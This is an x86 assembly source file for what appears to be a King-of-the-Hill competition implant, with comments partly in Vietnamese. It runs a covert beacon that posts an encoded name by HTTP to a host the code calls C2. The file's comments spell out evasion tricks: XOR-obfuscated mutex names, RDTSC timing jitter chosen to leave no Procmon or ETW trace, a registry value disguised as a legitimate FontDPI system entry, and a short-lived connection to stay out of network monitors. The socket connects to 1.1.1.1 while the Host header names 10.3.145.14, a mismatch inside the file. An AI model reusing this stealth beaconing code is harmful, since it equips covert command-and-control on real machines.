; ================================================================
; main.asm  —  KotH Main Process
;
; Build:
;   ml /c /coff main.asm
;   link /subsystem:windows /entry:MainProc main.obj ^
;        kernel32.lib advapi32.lib ws2_32.lib
;
; BEFORE BUILDING:
;   1. Replace "TenThiSinhCuaBan" in szMyName with your real name
;   2. Change MUTEX_XOR_KEY so Watchdog uses the same constant
;
; Architecture:
;   MainProc  ──►  CalcMutexName   (time-based, changes every 3 h)
;             ──►  OpenMutexA      (abort if dupe instance)
;             ──►  CreateMutexA    (claim ownership)
;             ──►  WSAStartup      (one-time WinSock init)
;             ──►  [loop]
;                    CalcWindowIdx  (which 3-h window are we in?)
;                    ShouldSend     (read Registry, compare window)
;                    CalcDelay      (RDTSC jitter, no API noise)
;                    Sleep(delay)
;                    Base64Encode   (encode name, no CRT)
;                    BuildHttpReq   (assemble POST /update)
;                    DoHttpPost     (socket→connect→send→recv→close)
;                    ParseResp200   (bytes [9..11] == "200"?)
;                    UpdateState    (write window index to Registry)
;                    Sleep(POLL_MS)
; ================================================================

.686
.model flat, stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\advapi32.inc
include \masm32\include\ws2_32.inc
include \masm32\include\user32.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\advapi32.lib
includelib \masm32\lib\ws2_32.lib
includelib \masm32\lib\user32.lib
; ── Tunable constants ────────────────────────────────────────────
; MUTEX_XOR_KEY: must match the same constant in your Watchdog binary
MUTEX_XOR_KEY   EQU 0DEAD1337h

; Networking
AF_INET_VAL     EQU 2
SOCK_STREAM_VAL EQU 1
IPPROTO_TCP_VAL EQU 6
; htons(5000):  5000 = 0x1388
;   network byte order → bytes in memory: 13h 88h
;   as x86 little-endian WORD: 0x8813
C2_PORT_NET     EQU 8813h

; Timing
POLL_MS         EQU 5000        ; polling interval: 5 seconds
MIN_JITTER_MS   EQU 600000      ; minimum jitter: 10 minutes
WIN_MS          EQU 10800000    ; 3-hour window in ms

; Registry
MUTEX_ALL_ACCESS EQU 1F0001h
REGKEY_ACCESS   EQU 000F003Fh   ; KEY_ALL_ACCESS

; Buffer sizes
HTTP_BUF_SZ     EQU 512
BODY_BUF_SZ     EQU 128
B64_BUF_SZ      EQU 64

; Offset of hex portion inside szMutexBuf ("Global\" is 7 bytes)
MUTEX_PREFIX    EQU 7

; ================================================================
.data

; ── Identity ─────────────────────────────────────────────────────
; Replace with your real name before building.
; This string is Base64-encoded at runtime before being sent.
szMyName        db "DoanNgocToan", 0

; ── Mutex ────────────────────────────────────────────────────────
; Layout: "Global\" (7 bytes) + 8 uppercase hex chars + null
; The hex portion is overwritten at startup by CalcMutexName.
szMutexBuf      db "Global\", 8 dup(' '), 0
hMutex          dd 0

; ── Registry state ───────────────────────────────────────────────
; We store the 3-hour window index (DWORD) in a Registry value.
; On query, if the stored index equals the current window index
; we skip sending (already sent in this window).
;
; The key + value name are chosen to look like legitimate system
; configuration entries that have existed since OS install.
szRegPath       db "SOFTWARE\Microsoft\Windows NT\CurrentVersion\FontDPI", 0
szRegValWin     db "LogPixels", 0   ; stores last sent window index
hRegKey         dd 0
dwRegDisp       dd 0
dwCurWindow     dd 0

; ── Networking ───────────────────────────────────────────────────
szC2IP          db "1.1.1.1", 0
wsaDataBuf      db 408 dup(0)       ; WSADATA (safe over-allocation)
sockAddrBuf     db  16 dup(0)       ; SOCKADDR_IN (16 bytes)
hSock           dd 0FFFFFFFFh       ; INVALID_SOCKET sentinel
iPostResult     dd 0

; ── Base64 ───────────────────────────────────────────────────────
szB64Table      db "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                db "abcdefghijklmnopqrstuvwxyz"
                db "0123456789+/"
szNameB64       db B64_BUF_SZ  dup(0)

; ── HTTP buffers ─────────────────────────────────────────────────
szHttpBody      db BODY_BUF_SZ dup(0)
szHttpReq       db HTTP_BUF_SZ dup(0)
szHttpResp      db HTTP_BUF_SZ dup(0)
szNumBuf        db 12 dup(0)        ; for IntToDecStr output

; ── HTTP string fragments (assembled at runtime) ─────────────────
szReqLine       db "POST /update HTTP/1.0", 13, 10, 0
szHostLine      db "Host: 10.3.145.14:5000", 13, 10, 0
szCTLine        db "Content-Type: application/json", 13, 10, 0
szCLLabel       db "Content-Length: ", 0
szCRLF          db 13, 10, 0
; JSON body fragments:  {"name":"  and  "}
; 34 = ASCII double-quote character
szBOpen         db "{", 34, "name", 34, ":", 34, 0
szBClose        db 34, "}", 0

; ── Helpers ──────────────────────────────────────────────────────
szHexChars      db "0123456789ABCDEF"
sysTime         SYSTEMTIME <>
dwJitterMs      dd 0

; ================================================================
.code

; ════════════════════════════════════════════════════════════════
; UTILITY PROCEDURES
; ════════════════════════════════════════════════════════════════

; ── ZeroMem ──────────────────────────────────────────────────────
; Zero-fill nSize bytes starting at pBuf.
; Uses rep stosb — no external API, no Procmon event.
; ─────────────────────────────────────────────────────────────────
ZeroMem PROC USES eax ecx edi, pBuf:DWORD, nSize:DWORD
    cld
    xor  eax, eax
    mov  edi, pBuf
    mov  ecx, nSize
    rep  stosb
    ret
ZeroMem ENDP

; ── MyStrLen ─────────────────────────────────────────────────────
; Returns: eax = length of null-terminated string (excluding null)
; ─────────────────────────────────────────────────────────────────
MyStrLen PROC USES ecx edi, pStr:DWORD
    cld
    mov  edi, pStr
    xor  ecx, ecx
    not  ecx              ; ecx = 0xFFFFFFFF
    xor  eax, eax         ; AL = 0 (search value)
    repne scasb           ; scan until [EDI] == 0
    not  ecx              ; ecx = bytes scanned including null
    dec  ecx              ; subtract 1 → length without null
    mov  eax, ecx
    ret
MyStrLen ENDP

; ── MyStrCat ─────────────────────────────────────────────────────
; Append null-terminated pSrc to end of pDst.
; Caller must ensure pDst buffer is large enough.
; ─────────────────────────────────────────────────────────────────
MyStrCat PROC USES eax esi edi, pDst:DWORD, pSrc:DWORD
    cld
    ; Walk to null terminator of pDst
    mov  edi, pDst
MSC_Find:
    mov  al, byte ptr [edi]
    test al, al
    jz   MSC_Copy
    inc  edi
    jmp  MSC_Find
MSC_Copy:
    ; Copy pSrc byte by byte, including null terminator
    mov  esi, pSrc
MSC_Loop:
    mov  al, byte ptr [esi]
    mov  byte ptr [edi], al
    inc  esi
    inc  edi
    test al, al
    jnz  MSC_Loop
    ret
MyStrCat ENDP

; ── DwordToHex8 ──────────────────────────────────────────────────
; Write DWORD dwVal as exactly 8 uppercase hex chars + null at pDst.
; Uses bit rotation: extract nibbles from MSN to LSN.
; ─────────────────────────────────────────────────────────────────
DwordToHex8 PROC USES eax ecx edx edi, dwVal:DWORD, pDst:DWORD
    mov  edi, pDst
    mov  eax, dwVal
    mov  ecx, 8
D2H_Loop:
    rol  eax, 4           ; bring next nibble into bits [3:0]
    mov  edx, eax
    and  edx, 0Fh         ; isolate nibble
    movzx edx, byte ptr szHexChars[edx]
    mov  byte ptr [edi], dl
    inc  edi
    dec  ecx
    jnz  D2H_Loop
    mov  byte ptr [edi], 0
    ret
DwordToHex8 ENDP

; ── IntToDecStr ──────────────────────────────────────────────────
; Convert unsigned DWORD dwVal to decimal ASCII string at pDst.
; Builds digits in reverse into a local temp buffer, then copies.
; ─────────────────────────────────────────────────────────────────
IntToDecStr PROC USES ebx ecx edx esi edi, dwVal:DWORD, pDst:DWORD
    local szTmp[12]:BYTE
    ; Point edi at the last position of temp buffer
    lea  edi, szTmp
    add  edi, 11
    mov  byte ptr [edi], 0    ; null terminator
    dec  edi
    mov  eax, dwVal
    mov  ecx, 10
ITS_Loop:
    xor  edx, edx
    div  ecx                  ; eax=quotient, edx=remainder
    add  dl, '0'
    mov  byte ptr [edi], dl
    dec  edi
    test eax, eax
    jnz  ITS_Loop
    inc  edi                  ; edi → first digit
    ; Copy to pDst
    mov  esi, edi
    mov  edi, pDst
ITS_Copy:
    mov  al, byte ptr [esi]
    mov  byte ptr [edi], al
    inc  esi
    inc  edi
    test al, al
    jnz  ITS_Copy
    ret
IntToDecStr ENDP

; ════════════════════════════════════════════════════════════════
; MUTEX MODULE
; ════════════════════════════════════════════════════════════════

; ── CalcMutexName ────────────────────────────────────────────────
; Computes a deterministic, time-stable mutex name:
;   "Global\" + uppercase_hex( (hour/3) XOR MUTEX_XOR_KEY )
;
; The name changes every 3 hours in sync with the scoring window.
; Both Main Process and Watchdog use the same formula independently
; so they agree on the current name without any IPC.
;
; Using XOR with a private constant means:
;   • WinObj/Handle viewer shows an opaque hex string, not a
;     descriptive name that reveals purpose.
;   • Adversaries cannot guess the name without knowing the key.
; ─────────────────────────────────────────────────────────────────
CalcMutexName PROC USES eax ecx edx
    invoke GetSystemTime, addr sysTime
    movzx eax, sysTime.wHour   ; 0..23
    mov   ecx, 3
    xor   edx, edx
    div   ecx                  ; eax = hour_slot (0..7)
    xor   eax, MUTEX_XOR_KEY   ; obfuscate with private seed
    invoke DwordToHex8, eax, addr szMutexBuf + MUTEX_PREFIX
    ret
CalcMutexName ENDP

; ════════════════════════════════════════════════════════════════
; TIMING MODULE
; ════════════════════════════════════════════════════════════════

; ── CalcWindowIdx ────────────────────────────────────────────────
; Returns: eax = current 3-hour window index (wHour / 3)
;
; All instances (Main, Watchdog) call this independently and get
; the same result, ensuring they agree on "which window" without
; needing to share state for this particular value.
; ─────────────────────────────────────────────────────────────────
CalcWindowIdx PROC USES ecx edx
    invoke GetSystemTime, addr sysTime
    movzx eax, sysTime.wHour
    mov   ecx, 3
    xor   edx, edx
    div   ecx              ; eax = hour / 3
    ret
CalcWindowIdx ENDP

; ── CalcDelay ────────────────────────────────────────────────────
; Returns: eax = random delay in ms, range [MIN_JITTER_MS, WIN_MS)
;
; Uses RDTSC (Read Time-Stamp Counter) as entropy source:
;   • RDTSC is a single CPU instruction — no syscall, no API call,
;     no event in Procmon / ETW.
;   • The counter value is highly variable (ns-level granularity)
;     making it a practical entropy source for this purpose.
;
; Scaling:
;   rand20 = RDTSC_low & 0xFFFFF  (0..1,048,575)
;   result = (rand20 * range) >> 32  +  MIN_JITTER_MS
;   where  range = WIN_MS - MIN_JITTER_MS = 10,200,000
;
; This gives: MIN_JITTER_MS (10 min) .. WIN_MS-1 (just under 3 h)
; ─────────────────────────────────────────────────────────────────
CalcDelay PROC USES edx ecx
    rdtsc                       ; Lấy timestamp vào EAX (bỏ qua EDX)
    mov  ecx, 10200000          ; Range = WIN_MS - MIN_JITTER_MS
    xor  edx, edx               ; Xóa EDX trước khi chia
    div  ecx                    ; EAX = Thương số, EDX = Số dư (0..10199999)
    mov  eax, edx               ; Lấy số dư làm jitter
    add  eax, MIN_JITTER_MS     ; Đẩy vào khoảng [600000 .. 10799999]
    ret
CalcDelay ENDP

; ── ShouldSend ───────────────────────────────────────────────────
; Returns: eax = 1 if we have NOT yet sent in dwCurWindow
;          eax = 0 if we already sent (dwStored == dwCurWindow)
;
; Reads the DWORD stored at szRegValWin under szRegPath.
; If the key/value is absent, we treat it as "not yet sent" and
; return 1. This makes the first run (fresh install) work without
; special-casing.
; ─────────────────────────────────────────────────────────────────
ShouldSend PROC USES ebx ecx edx
    local dwStored:DWORD
    local dwSz:DWORD

    mov  dwSz, 4

    ; Open (or create) the key — creation is safe here because the
    ; key path already exists on all Windows installs (FontDPI).
    invoke RegCreateKeyExA,
           HKEY_LOCAL_MACHINE, addr szRegPath,
           0, NULL,
           REG_OPTION_NON_VOLATILE, REGKEY_ACCESS,
           NULL, addr hRegKey, addr dwRegDisp
    test eax, eax
    jnz  SS_Yes             ; can't open → treat as "not sent"

    ; Try reading the window-index DWORD.
    ; lpReserved MUST be NULL per MSDN.
    invoke RegQueryValueExA,
           hRegKey, addr szRegValWin,
           NULL, NULL,
           addr dwStored, addr dwSz
    invoke RegCloseKey, hRegKey

    test eax, eax
    jnz  SS_Yes             ; value absent → not sent yet

    ; Compare stored window against current window
    mov  eax, dwStored
    cmp  eax, dwCurWindow
    je   SS_No              ; same window → already sent

SS_Yes:
    mov  eax, 1
    ret
SS_No:
    xor  eax, eax
    ret
ShouldSend ENDP

; ════════════════════════════════════════════════════════════════
; NETWORK MODULE
; ════════════════════════════════════════════════════════════════

; ── Base64Encode ─────────────────────────────────────────────────
; Standard RFC 4648 Base64.  Processes input in groups of 3 bytes,
; emitting 4 characters per group.  Pads with '=' as needed.
;
; Parameters:
;   pSrc  — pointer to input bytes
;   nLen  — number of input bytes (from MyStrLen)
;   pDst  — pointer to output buffer (must be ≥ ceil(n/3)*4 + 1)
;
; Register use:
;   esi = source pointer
;   edi = destination pointer
;   ecx = remaining input bytes
;   edx = 24-bit group assembled from up to 3 bytes
;   ebx = count of real bytes loaded (1, 2, or 3)
; ─────────────────────────────────────────────────────────────────
Base64Encode PROC USES esi edi ebx ecx edx,
             pSrc:DWORD, nLen:DWORD, pDst:DWORD
    mov  esi, pSrc
    mov  edi, pDst
    mov  ecx, nLen

B64_Loop:
    cmp  ecx, 0
    jle  B64_Done

    ; ── Load up to 3 input bytes into edx (left-aligned in [23:0]) ─
    xor  edx, edx

    ; Byte 1 — always present (we checked ecx > 0 above)
    movzx eax, byte ptr [esi]
    inc  esi
    dec  ecx
    shl  eax, 16
    or   edx, eax
    mov  ebx, 1

    ; Byte 2 — present if ecx > 0
    cmp  ecx, 0
    jle  B64_Encode
    movzx eax, byte ptr [esi]
    inc  esi
    dec  ecx
    shl  eax, 8
    or   edx, eax
    mov  ebx, 2

    ; Byte 3 — present if ecx > 0
    cmp  ecx, 0
    jle  B64_Encode
    movzx eax, byte ptr [esi]
    inc  esi
    dec  ecx
    or   edx, eax
    mov  ebx, 3

B64_Encode:
    ; ── Emit character 1 (bits [23:18]) — always present ───────
    mov  eax, edx
    shr  eax, 18
    and  eax, 03Fh
    movzx eax, byte ptr szB64Table[eax]
    mov  byte ptr [edi], al
    inc  edi

    ; ── Emit character 2 (bits [17:12]) — always present ───────
    mov  eax, edx
    shr  eax, 12
    and  eax, 03Fh
    movzx eax, byte ptr szB64Table[eax]
    mov  byte ptr [edi], al
    inc  edi

    ; ── Emit character 3 (bits [11:6]) or '=' if only 1 input byte
    cmp  ebx, 1
    jne  B64_C3Real
    mov  byte ptr [edi], '='
    inc  edi
    mov  byte ptr [edi], '='   ; character 4 is also '='
    inc  edi
    jmp  B64_Loop

B64_C3Real:
    mov  eax, edx
    shr  eax, 6
    and  eax, 03Fh
    movzx eax, byte ptr szB64Table[eax]
    mov  byte ptr [edi], al
    inc  edi

    ; ── Emit character 4 (bits [5:0]) or '=' if only 2 input bytes
    cmp  ebx, 2
    jne  B64_C4Real
    mov  byte ptr [edi], '='
    inc  edi
    jmp  B64_Loop

B64_C4Real:
    mov  eax, edx
    and  eax, 03Fh
    movzx eax, byte ptr szB64Table[eax]
    mov  byte ptr [edi], al
    inc  edi
    jmp  B64_Loop

B64_Done:
    mov  byte ptr [edi], 0     ; null-terminate the output
    ret
Base64Encode ENDP

; ── BuildHttpReq ─────────────────────────────────────────────────
; Assembles the complete HTTP/1.0 POST request into szHttpReq.
;
; Final format (CRLF shown as ↵):
;   POST /update HTTP/1.0↵
;   Host: 10.3.145.14:5000↵
;   Content-Type: application/json↵
;   Content-Length: NN↵
;   ↵
;   {"name":"BASE64VALUE"}
;
; Note: HTTP/1.0 with no Connection header means the server will
; close the connection immediately after the response — shorter
; TCP lifetime, less exposure in TCPView/Wireshark.
; ─────────────────────────────────────────────────────────────────
BuildHttpReq PROC USES eax
    ; Zero out both buffers before building
    invoke ZeroMem, addr szHttpBody, BODY_BUF_SZ
    invoke ZeroMem, addr szHttpReq,  HTTP_BUF_SZ

    ; Build JSON body: {"name":"BASE64VALUE"}
    invoke MyStrCat, addr szHttpBody, addr szBOpen   ; {"name":"
    invoke MyStrCat, addr szHttpBody, addr szNameB64 ; BASE64...
    invoke MyStrCat, addr szHttpBody, addr szBClose  ; "}

    ; Convert body length to decimal string for Content-Length header
    invoke MyStrLen, addr szHttpBody
    invoke IntToDecStr, eax, addr szNumBuf

    ; Assemble full request
    invoke MyStrCat, addr szHttpReq, addr szReqLine  ; POST /update HTTP/1.0\r\n
    invoke MyStrCat, addr szHttpReq, addr szHostLine ; Host: ...\r\n
    invoke MyStrCat, addr szHttpReq, addr szCTLine   ; Content-Type: ...\r\n
    invoke MyStrCat, addr szHttpReq, addr szCLLabel  ; Content-Length: 
    invoke MyStrCat, addr szHttpReq, addr szNumBuf   ; NN
    invoke MyStrCat, addr szHttpReq, addr szCRLF     ; \r\n  (end of CL line)
    invoke MyStrCat, addr szHttpReq, addr szCRLF     ; \r\n  (blank line)
    invoke MyStrCat, addr szHttpReq, addr szHttpBody ; body
    ret
BuildHttpReq ENDP

; ── ParseResp200 ─────────────────────────────────────────────────
; Returns: eax = 1 if bytes [9..11] of pBuf == '2','0','0'
;          eax = 0 otherwise
;
; HTTP/1.x response first line:
;   "HTTP/1.0 200 OK\r\n"
;    0123456789  ← byte offsets
;              ^-- "200" starts at offset 9
; ─────────────────────────────────────────────────────────────────
ParseResp200 PROC USES esi, pBuf:DWORD
    mov  esi, pBuf
    ; Need at least 12 bytes to safely read offset 9,10,11
    invoke MyStrLen, pBuf
    cmp  eax, 12
    jl   PR_No
    cmp  byte ptr [esi+9],  '2'
    jne  PR_No
    cmp  byte ptr [esi+10], '0'
    jne  PR_No
    cmp  byte ptr [esi+11], '0'
    jne  PR_No
    mov  eax, 1
    ret
PR_No:
    xor  eax, eax
    ret
ParseResp200 ENDP

; ── DoHttpPost ───────────────────────────────────────────────────
; Opens a TCP socket, connects to C2, sends szHttpReq, receives
; the response, then closes the socket.
; Returns: eax = 1 on HTTP 200, 0 on any error or non-200 status.
;
; Design notes:
;   • A separate child-process approach could further decouple the
;     network activity from Main Process in TCPView (see comments
;     in watchdog design). For this baseline, inline is simpler.
;   • Single send() call is safe for requests < ~1400 bytes (MTU).
;   • Single recv() call is safe for LAN responses < 511 bytes.
;   • HTTP/1.0 means the server closes the connection after
;     sending the response — no keep-alive to maintain.
; ─────────────────────────────────────────────────────────────────
DoHttpPost PROC USES esi edi ebx
    mov  iPostResult, 0

    ; ── Create TCP socket ───────────────────────────────────────
    invoke socket, AF_INET_VAL, SOCK_STREAM_VAL, IPPROTO_TCP_VAL
    cmp  eax, 0FFFFFFFFh        ; INVALID_SOCKET
    je   DHP_Done
    mov  hSock, eax

    ; ── Fill SOCKADDR_IN (16 bytes) ────────────────────────────
    ; Layout: [sin_family:2][sin_port:2][sin_addr:4][sin_zero:8]
    invoke ZeroMem, addr sockAddrBuf, 16
    mov  word  ptr sockAddrBuf,   AF_INET_VAL   ; sin_family = 2
    mov  word  ptr sockAddrBuf+2, C2_PORT_NET   ; sin_port  (network order)
    invoke inet_addr, addr szC2IP               ; → DWORD in network order
    mov  dword ptr sockAddrBuf+4, eax           ; sin_addr

    ; ── Connect ────────────────────────────────────────────────
    invoke connect, hSock, addr sockAddrBuf, 16
    cmp  eax, 0FFFFFFFFh
    je   DHP_Close

    ; ── Send ───────────────────────────────────────────────────
    ; send() returns bytes sent. For small payloads on LAN,
    ; a single call succeeds. We do not loop on partial sends here
    ; because the request is always well under MTU.
    invoke MyStrLen, addr szHttpReq
    invoke send, hSock, addr szHttpReq, eax, 0
    cmp  eax, 0FFFFFFFFh
    je   DHP_Close

    ; ── Receive ────────────────────────────────────────────────
    invoke ZeroMem, addr szHttpResp, HTTP_BUF_SZ
    invoke recv, hSock, addr szHttpResp, HTTP_BUF_SZ - 1, 0
    cmp  eax, 0
    jle  DHP_Close

    ; ── Parse status code ──────────────────────────────────────
    invoke ParseResp200, addr szHttpResp
    mov  iPostResult, eax

DHP_Close:
    invoke closesocket, hSock
    mov  hSock, 0FFFFFFFFh

DHP_Done:
    mov  eax, iPostResult
    ret
DoHttpPost ENDP

; ════════════════════════════════════════════════════════════════
; REGISTRY STATE MODULE
; ════════════════════════════════════════════════════════════════

; ── UpdateState ──────────────────────────────────────────────────
; Writes dwCurWindow (DWORD) to szRegValWin under szRegPath.
; Called only after a confirmed HTTP 200 so we don't mark the
; window as "done" on a failed or unacknowledged send.
; ─────────────────────────────────────────────────────────────────
UpdateState PROC USES eax
    invoke RegCreateKeyExA,
           HKEY_LOCAL_MACHINE, addr szRegPath,
           0, NULL,
           REG_OPTION_NON_VOLATILE, REGKEY_ACCESS,
           NULL, addr hRegKey, addr dwRegDisp
    test eax, eax
    jnz  US_Done

    invoke RegSetValueExA,
           hRegKey, addr szRegValWin,
           0, REG_DWORD,
           addr dwCurWindow, 4

    invoke RegCloseKey, hRegKey
US_Done:
    ret
UpdateState ENDP

; ════════════════════════════════════════════════════════════════
; ENTRY POINT
; ════════════════════════════════════════════════════════════════
; MainProc PROC
;     ; ── 1. Compute time-based mutex name ────────────────────────
;     call CalcMutexName

;     ; ── 2. Guard against duplicate instances ────────────────────
;     ; If OpenMutexA succeeds (returns non-NULL), another instance
;     ; is already running and holds the mutex. Exit immediately.
;     invoke OpenMutexA, MUTEX_ALL_ACCESS, FALSE, addr szMutexBuf
;     test eax, eax
;     jnz  MP_Dup

;     ; ── 3. Create and hold mutex ────────────────────────────────
;     ; bInitialOwner = TRUE: we take ownership immediately.
;     ; While hMutex is held, Watchdog's OpenMutex call will succeed
;     ; → Watchdog knows Main Process is alive.
;     invoke CreateMutexA, NULL, TRUE, addr szMutexBuf
;     mov  hMutex, eax

;     ; ── 4. Initialize WinSock 2.2 (one-time) ───────────────────
;     invoke WSAStartup, 0202h, addr wsaDataBuf
;     test eax, eax
;     jnz  MP_Clean

;     ; ════════════════════════════════════════════════════════════
;     ; MAIN LOOP
;     ; Runs indefinitely, waking every POLL_MS to evaluate state.
;     ; ════════════════════════════════════════════════════════════
; MP_Loop:

;     ; ── 5. Determine current 3-hour window ──────────────────────
;     call CalcWindowIdx
;     mov  dwCurWindow, eax

;     ;     ; ── 6. Check if we already sent in this window ──────────────
;     call ShouldSend
;     test eax, eax
;     jz   MP_Sleep           ; already sent → just sleep and poll

;     ; ; ── 7. Random jitter before sending ─────────────────────────
;     ; ; Sending at a random offset within the 3-hour window prevents
;     ; ; an adversary from predicting exactly when the packet will fly,
;     ; ; making "wait and intercept" much harder.
;     ; call CalcDelay
;     mov  dwJitterMs, eax
;     invoke Sleep, dwJitterMs

;     ; ── 8. Re-check window after sleeping ───────────────────────
;     ; If the jitter delay crossed a 3-hour boundary, the current
;     ; window has changed. Skip this cycle to avoid double-counting
;     ; or sending in the wrong window's accounting.
;     call CalcWindowIdx
;     cmp  eax, dwCurWindow
;     jne  MP_Sleep           ; boundary crossed → skip

;     ; ── 9. Encode name and assemble request ─────────────────────
;     invoke MyStrLen, addr szMyName
;     invoke Base64Encode, addr szMyName, eax, addr szNameB64
;     call BuildHttpReq

;     ; ── 10. Send HTTP POST and check response ───────────────────
;     call DoHttpPost
;     test eax, eax
;     jz   MP_Sleep           ; send failed or non-200 → try next cycle

;     ; ── 11. Record successful send in Registry ──────────────────
;     call UpdateState

; MP_Sleep:
;     invoke Sleep, POLL_MS
;     jmp  MP_Loop

;     ; ── Cleanup paths (normally unreachable in competition) ─────
; MP_Clean:
;     invoke WSACleanup
; MP_Dup:
;     invoke ExitProcess, 0

; MainProc ENDP

; ════════════════════════════════════════════════════════════════
; ENTRY POINT (PHIÊN BẢN DÀNH RIÊNG ĐỂ TEST MẠNG & WIRESHARK)
; ════════════════════════════════════════════════════════════════
MainProc PROC

    ; ── 1. Khởi tạo WinSock (Bắt buộc để gọi hàm mạng) ──────────
    invoke WSAStartup, 0202h, addr wsaDataBuf
    test eax, eax
    jnz  MP_Clean

    ; ════════════════════════════════════════════════════════════
    ; VÒNG LẶP TEST (Bỏ qua Mutex, bỏ qua Registry, bỏ qua Jitter)
    ; ════════════════════════════════════════════════════════════
MP_TestLoop:

    ; ── 2. Mã hóa tên và đóng gói HTTP Request ──────────────────
    invoke MyStrLen, addr szMyName
    invoke Base64Encode, addr szMyName, eax, addr szNameB64
    call BuildHttpReq

    ; ── 3. Gửi thẳng ra mạng qua Socket ─────────────────────────
    call DoHttpPost

    ; ── 4. Ngủ đúng 1 giây (1000 ms) rồi bắn tiếp ───────────────
    invoke Sleep, 1000
    jmp  MP_TestLoop

MP_Clean:
    invoke WSACleanup
    invoke ExitProcess, 0

MainProc ENDP
END MainProc
; ================================================================
; END OF FILE
;
; Build reminder:
;   ml /c /coff main.asm
;   link /subsystem:windows /entry:MainProc main.obj ^
;        kernel32.lib advapi32.lib ws2_32.lib
;
; The resulting .exe has no CRT dependency, no console window,
; and no import for AMSI-hooked script engines.
; ================================================================
